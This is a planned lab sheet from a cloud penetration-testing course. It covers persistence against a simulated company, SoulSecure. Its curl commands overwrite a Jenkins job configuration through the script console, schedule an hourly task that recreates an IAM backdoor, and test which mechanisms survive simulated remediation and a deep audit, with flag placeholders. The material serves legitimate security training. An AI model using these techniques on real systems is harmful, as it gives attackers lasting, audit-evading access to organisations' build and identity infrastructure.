# Module 5 — Lab 5: Persistence via CI/CD & Automation

> **⚠️ PLANNED CONTENT — not yet built or deployed.** Describes the intended lab for
> review before implementation. Nothing below is live yet.

**Course:** Cloud Pentest — Module 5: Post-Exploitation, Persistence & Lateral Movement
**Target:** SoulSecure Inc. (simulated engagement — last lab of Module 5)
**Target host:** `http://<TARGET_IP>:9090/` (`jenkins-old`) and `https://iam.soulsecure.lab/`
**Estimated time:** 90–120 minutes

---

## 1. Recap & scenario

Last lab of Module 5 — and in a real sense, the last lab of the whole three-module
arc that started with Module 3's initial access. You have IAM backdoors (Lab 1), a
compute pivot (Lab 2), a host-level container escape (Lab 3), and exfiltration
techniques (Lab 4). This lab asks the hardest version of the persistence question
yet: not "does it survive a routine credential rotation," but "does it survive
someone actually looking."

> **Scope reminder:** `jenkins-old` and `iam.soulsecure.lab`. Active exploitation
> authorized.

## 2. Learning objectives

- Use CI/CD code execution (from Module 3 Lab 3) to plant a persistence mechanism
  that lives in a build job's configuration, not a credential
- Create a scheduled automation task that re-establishes access on its own, without
  further action from you
- Understand "self-healing" persistence and why it's a meaningfully higher tier of
  risk than a single backdoor
- Compare which of your Module 5 persistence mechanisms survive a genuinely thorough
  security review versus a routine one — and understand why the answer differs by
  category, not by how cleverly any single mechanism was built

## 3. Tasks

### 3.1 — Backdoor a build job

Use the script console access from Module 3 Lab 3 to rewrite `nightly-deploy`'s
configuration, adding a build step of your choosing. This survives credential
rotation entirely — it doesn't depend on any access key at all, only on the job
existing and running on its normal schedule.

```bash
curl -s http://<TARGET_IP>:9090/script -X POST \
  --data-urlencode 'script=new File("/var/jenkins_home/jobs/nightly-deploy/config.xml").text = "<config with an added shell step>"'
```

### 3.2 — Make your IAM backdoor self-healing

The backdoor identity you created in Lab 1 is solid, but it's still a single point
of failure — if someone finds and deletes it, it's gone. Use the automation service
from Module 4 Lab 3 to schedule a recurring task that recreates it automatically if
it's ever missing:

```bash
curl -sk -X POST https://iam.soulsecure.lab/automation/create-task \
  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>" \
  -H 'Content-Type: application/json' \
  -d '{"execution_role": "arn:aws:iam::445566778899:role/automation-admin-role", "command": "recreate-backdoor-if-missing", "schedule": "rate(1 hour)"}'
```

### 3.3 — Test against routine remediation

Run the same simulated remediation from Lab 1. Your Lab 1 backdoor user should get
caught and removed this time (assume the review has since learned to look for it) —
but check whether it comes back on its own.

```bash
curl -sk -X POST https://iam.soulsecure.lab/admin/simulate-remediation \
  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>"

curl -sk https://iam.soulsecure.lab/iam/list-all-identities \
  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>"
```

### 3.4 — Harder mode: survive a deep audit

There's a second, more thorough review this environment can simulate — one that
specifically hunts for suspicious CI/CD build steps and scheduled automation tasks by
keyword, not just credential lists:

```bash
curl -sk -X POST https://iam.soulsecure.lab/admin/simulate-deep-audit \
  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>"
```

This will likely catch and remove your Lab 5 mechanisms (3.1 and 3.2). Check whether
anything from **Lab 1** — specifically, the mechanism that wasn't a new user, a new
key, or a new job/task — still works afterward.

## 4. Tools you'll want

- `curl` — as with every CI/CD or IAM-adjacent lab this course

## 5. Deliverable: Module 5 Wrap-Up — Full Persistence & Lateral Movement Summary

Last lab of Module 5. Consolidate every persistence mechanism and lateral movement
path from all five labs, and rank them by how much scrutiny each would need to
survive in a real environment.

| Mechanism | Source lab | Survives routine remediation? | Survives deep audit? |
|---|---|---|---|
| | Lab 1 | | |
| | Lab 1 | | |
| | Lab 1 | | |
| | Lab 5 | | |
| | Lab 5 | | |

**Flags found:**

- [ ] Flag 1 (Jenkins job backdoored via script console): `flag{________________________________}`
- [ ] Flag 2 (self-healing scheduled task created): `flag{________________________________}`
- [ ] Flag 3 (confirmed self-healing survived routine remediation): `flag{________________________________}`
- [ ] Flag 4 (harder mode — Lab 1's trust-policy backdoor survived the deep audit): `flag{________________________________}`

## 6. Hints

<details>
<summary>Hint 1 — what the backdoored config should contain</summary>

A build step that's clearly a proof-of-concept, not something destructive — the
point is demonstrating the persistence mechanism works, not causing damage.
</details>

<details>
<summary>Hint 2 — the schedule field</summary>

The exact `rate(1 hour)` string doesn't need to trigger real waiting — this lab
environment evaluates "did the scheduled task get created correctly," not real
elapsed time.
</details>

<details>
<summary>Hint 3 — which Lab 1 mechanism to re-check</summary>

Go back to your Lab 1 notes. You planted three things: a new user, a trust-policy
addition, and a second key on an existing identity. Which one doesn't show up in any
user list, job config, or scheduled-task list — the places a deep audit would
actually look?
</details>

## 7. Known limitations

`/admin/simulate-deep-audit` is a training convenience representing "a more thorough
review than routine remediation," not a model of real incident-response
methodology. Same Jenkins/`iam-sim` simplifications as every other lab referencing
them.

## 8. Next up

Module 5 is done — and with it, the full initial-access-through-persistence arc that
began in Module 3. Module 6 (Cloud Pentesting Tools & Hands-on Labs) shifts from
doing every technique by hand to using the tools professionals actually run, and
closes with a capstone that chains the entire Module 3–5 arc in one continuous
engagement.
